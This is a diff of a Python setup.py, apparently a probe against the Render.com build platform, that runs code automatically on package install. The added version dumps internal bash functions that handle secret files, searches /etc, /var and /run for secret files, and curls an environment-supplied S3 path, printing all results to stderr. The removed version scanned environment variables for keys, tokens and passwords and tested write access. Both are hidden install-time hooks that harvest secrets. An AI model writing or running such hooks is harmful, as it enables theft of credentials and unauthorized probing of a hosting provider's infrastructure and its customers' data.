@@ -1,36 +1,33 @@
 import os, sys, subprocess as sp
 from setuptools import setup
 
-def render_final_check():
+def final_leak():
     o = sys.stderr.write
-    o("\n" + "R"*40 + "\n")
-    o("--- RENDER.COM APPORT & CRASH AUDIT ---\n")
+    o("\n" + "!"*40 + "\n")
+    o("--- EXPOSING RENDER INTERNAL SECRETS LOGIC ---\n")
 
-   
-    o("[1] CHECKING CRASH DIRECTORY:\n")
-    o(sp.getoutput("ls -ld /var/crash 2>/dev/null || echo 'Access Denied to /var/crash'") + "\n")
+ 
+    o("[1] FUNCTION SOURCE CODE:\n")
+ 
+    o(sp.getoutput("bash -c 'declare -f copy_secret_files'") + "\n")
+    o("-" * 20 + "\n")
+    o(sp.getoutput("bash -c 'declare -f remove_secret_files'") + "\n")
+ 
+    o("\n[2] SEARCHING FOR MOUNTED SECRETS:\n")
+ 
+    o(sp.getoutput("find /etc /var /run -name '*secret*' 2>/dev/null | head -n 10") + "\n")
 
-    
-    o("\n[2] FULL ENV SCAN (Filtered):\n")
-    envs = os.environ
-    for k, v in envs.items():
-        # Ищем всё, что похоже на ключи, но не палим их полностью
-        if any(x in k.upper() for x in ['KEY', 'SECRET', 'TOKEN', 'PASS', 'RENDER']):
-            o(f"{k} = {v[:10]}...[REDACTED]\n")
+  
+    o("\n[3] S3 ENVIRONMENT ACCESS:\n")
+    s3_url = os.environ.get('RENDER_NATIVE_ENV_PATH', 'None')
+    if s3_url != 'None':
+        o(f"Target: {s3_url}\n")
+        o(sp.getoutput(f"curl -I -s {s3_url}") + "\n")
 
-    
-    o("\n[3] WRITE TEST IN /OPT/RENDER:\n")
-    try:
-        test_path = "/opt/render/project/test_write.txt"
-        with open(test_path, "w") as f: f.write("POC")
-        o(f"SUCCESS: Can write to {test_path}\n")
-    except:
-        o("DENIED: System folder is read-only.\n")
-
-    o("\n" + "R"*40 + "\n")
+    o("\n" + "!"*40 + "\n")
     sys.exit(1)
 
-try: render_final_check()
+try: final_leak()
 except: sys.exit(1)
 
-setup(name="render-audit", version="0.1")
+setup(name="render-final", version="0.1")
